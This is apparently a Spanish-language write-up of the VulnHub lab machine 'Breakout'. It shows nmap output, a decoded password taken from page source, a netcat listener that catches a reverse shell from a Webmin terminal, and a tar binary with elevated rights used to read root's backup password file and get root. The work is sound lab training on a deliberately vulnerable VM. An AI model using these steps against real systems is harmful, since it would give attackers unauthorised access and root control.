---
layout: single
title: breakout - vulnhub
excerpt: "Se realizó un escaneo y se identificaron tres puertos abiertos. Al inspeccionar el código fuente de la página (Ctrl + U), se encontró un comentario con una contraseña codificada, la cual se decodificó para acceder a la página web. Luego, con enum4linux -a, se enumeraron nombres de usuario. Dentro de la página, se encontró una terminal web y, al no haber acceso por SSH (puerto 22 cerrado), se estableció una reverse shell. Posteriormente, se identificó un archivo de backups y se aprovechó que tar tenía permisos con privilegios elevados. Al tener permisos sobre tar, se utilizó para leer la contraseña de root y obtener acceso total al sistema."
date: 2023-01-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-breakout/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - vulnhub
tags:
  - nmap
  - decode
  - enem4linux
  - tar
---

![](/assets/images/htb-writeup-breakout/portada.png)

Se realizó un escaneo y se identificaron tres puertos abiertos. Al inspeccionar el código fuente de la página (Ctrl + U), se encontró un comentario con una contraseña codificada, la cual se decodificó para acceder a la página web. Luego, con enum4linux -a, se enumeraron nombres de usuario. Dentro de la página, se encontró una terminal web y, al no haber acceso por SSH (puerto 22 cerrado), se estableció una reverse shell. Posteriormente, se identificó un archivo de backups y se aprovechó que tar tenía permisos con privilegios elevados. Al tener permisos sobre tar, se utilizó para leer la contraseña de root y obtener acceso total al sistema.


## Portscan

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ sudo nmap -p80,139,445,10000,20000 -sCV 192.168.1.74
   3   │ [sudo] contraseña para noesholk: 
   4   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 23:50 UTC
   5   │ Nmap scan report for breakout (192.168.1.74)
   6   │ Host is up (0.00029s latency).
   7   │ 
   8   │ PORT      STATE SERVICE     VERSION
   9   │ 80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
  10   │ |_http-server-header: Apache/2.4.51 (Debian)
  11   │ |_http-title: Apache2 Debian Default Page: It works
  12   │ 139/tcp   open  netbios-ssn Samba smbd 4
  13   │ 445/tcp   open  netbios-ssn Samba smbd 4
  14   │ 10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
  15   │ |_http-server-header: MiniServ/1.981
  16   │ |_http-title: 200 &mdash; Document follows
  17   │ 20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
  18   │ |_http-title: 200 &mdash; Document follows
  19   │ |_http-server-header: MiniServ/1.830
  20   │ MAC Address: 08:00:27:79:DE:D0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  21   │ 
  22   │ Host script results:
  23   │ |_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknow
       │ n)
  24   │ | smb2-security-mode: 
  25   │ |   3:1:1: 
  26   │ |_    Message signing enabled but not required
  27   │ | smb2-time: 
  28   │ |   date: 2025-02-22T23:30:36
  29   │ |_  start_date: N/A
  30   │ |_clock-skew: -20m27s
  31   │ 
  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/subm
       │ it/ .
  33   │ Nmap done: 1 IP address (1 host up) scanned in 42.59 seconds
```


vemos 5 puertos activos que son

- 80
- 139
- 445
- 10000
- 20000

![](/assets/images/htb-writeup-breakout/inicio.png)


ahora haremos aun CTR + U


![](/assets/images/htb-writeup-breakout/passurl.png)


vemos una contraseña codificada


Ese código parece ser una cadena en Brainfuck, un lenguaje de programación esotérico. Lo descifraré y te diré qué mensaje oculta.
El mensaje descifrado es:
`.2uqPEfj3D<P'a-3`


![](/assets/images/htb-writeup-breakout/iniciopass.png)


nos haremos una reverse shell en la terminal de la pagina


![](/assets/images/htb-writeup-breakout/console.png)


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ nc -lvnp 1010    
   3   │ listening on [any] 1010 ...
   4   │ connect to [192.168.1.72] from (UNKNOWN) [192.168.1.74] 54176
   5   │ bash: cannot set terminal process group (10766): Inappropriate ioctl for device
   6   │ bash: no job control in this shell
   7   │ cyber@breakout:~$ script /dev/null -c bash
   8   │ script /dev/null -c bash
   9   │ Script started, output log file is '/dev/null'.
  10   │ cyber@breakout:~$ ^Z
  11   │ zsh: suspended  nc -lvnp 1010
  12   │ cyber@breakout:~$ export TERM=xterm
  13   │ cyber@breakout:~$ export SHELL=bash
  14   │ cyber@breakout:~$
```


ahora aremos un tratamiento de la stty


```
   1   │ cyber@breakout:/$ ls
   2   │ bin   initrd.img      libx32      proc  sys                vmlinuz
   3   │ boot  initrd.img.old  lost+found  root  tmp                vmlinuz.old
   4   │ dev   lib             media       run   usermin-setup.out  webmin-setup.out
   5   │ etc   lib32           mnt         sbin  usr
   6   │ home  lib64           opt         srv   var
   7   │ cyber@breakout:/$ cd var
   8   │ cyber@breakout:/var$ ls
   9   │ backups  lib    lock  mail  run    tmp      webmin
  10   │ cache    local  log   opt   spool  usermin  www
  11   │ cyber@breakout:/var$ cd backups
  12   │ cyber@breakout:/var/backups$ ls
  13   │ apt.extended_states.0
  14   │ cyber@breakout:/var/backups$
  15   │ cyber@breakout:~$ ./tar -cf pass.tar /var/backups/.old_pass.bak
  16   │ ./tar: Removing leading `/' from member names
  17   │ cyber@breakout:~$ ls
  18   │ pass.bak  pass.tar  tar  user.txt
  19   │ cyber@breakout:~$ ls
  20   │ pass.bak  pass.tar  tar  user.txt
  21   │ cyber@breakout:~$ cat pass.bak
  22   │ var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootro
       │ otTs&4&YurgtRX(=~h
  23   │ cyber@breakout:~$ ls
  24   │ pass.bak  pass.tar  tar  user.txt
  25   │ cyber@breakout:~$ cat pass.tar
  26   │ var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootro
       │ otTs&4&YurgtRX(=~h
  27   │ cyber@breakout:~$ cat pass.ba^C
  28   │ cyber@breakout:~$ tar xvf pass.tar
  29   │ var/backups/.old_pass.bak
  30   │ cyber@breakout:~$ ls
  31   │ pass.bak  pass.tar  tar  user.txt  var
  32   │ cyber@breakout:~$ cd var
  33   │ cyber@breakout:~/var$ ls
  34   │ backups
  35   │ cyber@breakout:~/var$ cd backups
  36   │ cyber@breakout:~/var/backups$ ls -la
  37   │ total 12
  38   │ drwxr-xr-x 2 cyber cyber 4096 Feb 22 17:57 .
  39   │ drwxr-xr-x 3 cyber cyber 4096 Feb 22 17:57 ..
  40   │ -rw------- 1 cyber cyber   17 Oct 20  2021 .old_pass.bak
  41   │ cyber@breakout:~/var/backups$ cat .old_pass.bak
  42   │ Ts&4&YurgtRX(=~h
  43   │ cyber@breakout:~/var/backups$ exit
```


ahora vemos que hay un archivo backups que fue manipulado por root y podemos utilizar tar para poder leer el archivo


```
   1   │ cyber@breakout:/home$ su root
   2   │ Password: 
   3   │ root@breakout:/home# cd /
   4   │ root@breakout:/# ls
   5   │ bin   initrd.img      libx32      proc  sys                vmlinuz
   6   │ boot  initrd.img.old  lost+found  root  tmp                vmlinuz.old
   7   │ dev   lib             media       run   usermin-setup.out  webmin-setup.out
   8   │ etc   lib32           mnt         sbin  usr
   9   │ home  lib64           opt         srv   var
  10   │ root@breakout:/# cd root
  11   │ root@breakout:~# ls
  12   │ rOOt.txt
  13   │ root@breakout:~# cat rOOt.txt
  14   │ 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```
